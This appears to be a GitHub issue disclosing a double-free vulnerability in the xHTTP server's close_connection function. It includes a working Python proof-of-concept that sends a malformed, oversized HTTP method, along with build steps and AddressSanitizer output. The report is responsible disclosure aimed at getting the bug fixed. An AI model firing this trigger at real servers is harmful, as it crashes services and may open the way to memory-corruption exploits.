| Hi!  It appears that xHTTP contains a double free vulnerability in close\_connection at xhttp.c, line 595.     [xHTTP/xhttp.c](https://github.com/cozis/xHTTP/blob/72f812dcb77629c55fba1fd1ed91d13a4b380f90/xhttp.c#L595)  Line 595 in [72f812d](/cozis/xHTTP/commit/72f812dcb77629c55fba1fd1ed91d13a4b380f90)   |  | free(conn->request.public.headers.list); | | --- | --- |      The double free can be triggered with a malformed HTTP request method. For example, the following python3 script will make a request to the server with a malformed HTTP request method to trigger the double free:  ``` #!/usr/bin/env python3  import socket  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  sock.connect(('localhost', 8080))  http_headers = (     #Request - http_headers     b'MALFORMEDMETHOD'*1000  +  # HTTP Method (POST Request).  Sending malformed HTTP Methods invokes a double free in xHTTP     b' '       b'/'       b' HTTP/1.0'       b'\r\n'      b'Host: '       b'localhost'       b':'       b'8080'       b'\r\n'       b'Accept-Encoding: '       b'identity'       b'\r\n'       b'Content-Type: '  #Content type     b'application/json'  #JSON content type     b'\r\n'            b'Connection: close\r\n'       b'User-Agent: '       b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'       b'\r\n'        b'Content-Length: '       b'152'  #Size - Content-Length_size     b'\r\n'       b'\r\n'  #Delim - crlf_headers_body         #Block - post_body         b'data=Somepostdata'    )  sock.send(http_headers) sock.recv(65535)  sock.close()  ```  To confirm the issue, I first compiled the example server with debug symbols and address sanitizer:  ``` gcc example.c  xhttp.c -o main -fsanitize=address -g  ```  Once the server was compiled, I executed the server on port 8080 xHTTP Server ``` $ ./main  ```  After the server was up and running I saved the python3 script I created from above and executed it, triggering a double free. Python3 script ``` $ python3 poc.py  ``` Address Sanitizer Output ``` =================================================================                        ==460363==ERROR: AddressSanitizer: attempting double-free on 0x611000000040 in thread T0:     #0 0x7f7cfaab76a8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52     #1 0x562a5c0a1727 in close_connection /home/kali/projects/fuzzing/xHTTP/xhttp.c:595      #2 0x562a5c0a9406 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1749                                                                                                        #3 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37                 #4 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                 #5 0x7f7cfa846244 in __libc_start_main_impl ../csu/libc-start.c:381                      #6 0x562a5c09f420 in _start (/home/kali/projects/fuzzing/xHTTP/main+0x5420)                                                                                                                                                                                           0x611000000040 is located 0 bytes inside of 256-byte region [0x611000000040,0x611000000140) freed by thread T0 here:                                                                     #0 0x7f7cfaab76a8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52        #1 0x562a5c0a3a4b in parse /home/kali/projects/fuzzing/xHTTP/xhttp.c:868                 #2 0x562a5c0a7371 in when_data_is_ready_to_be_read /home/kali/projects/fuzzing/xHTTP/xhttp.c:1459     #3 0x562a5c0a92e0 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1735                #4 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37                 #5 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58                                                                                          previously allocated by thread T0 here:                                                                                                                                              #0 0x7f7cfaab78d5 in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:85     #1 0x562a5c0a2dca in parse /home/kali/projects/fuzzing/xHTTP/xhttp.c:813                 #2 0x562a5c0a7371 in when_data_is_ready_to_be_read /home/kali/projects/fuzzing/xHTTP/xhttp.c:1459     #3 0x562a5c0a92e0 in xhttp /home/kali/projects/fuzzing/xHTTP/xhttp.c:1735     #4 0x562a5c09f693 in main /home/kali/projects/fuzzing/xHTTP/example.c:37     #5 0x7f7cfa846189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58  SUMMARY: AddressSanitizer: double-free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:52 in __interceptor_free   ```  A possible fix could be implementing a check to ensure ' conn->request.public.headers.list ' is only freed once.
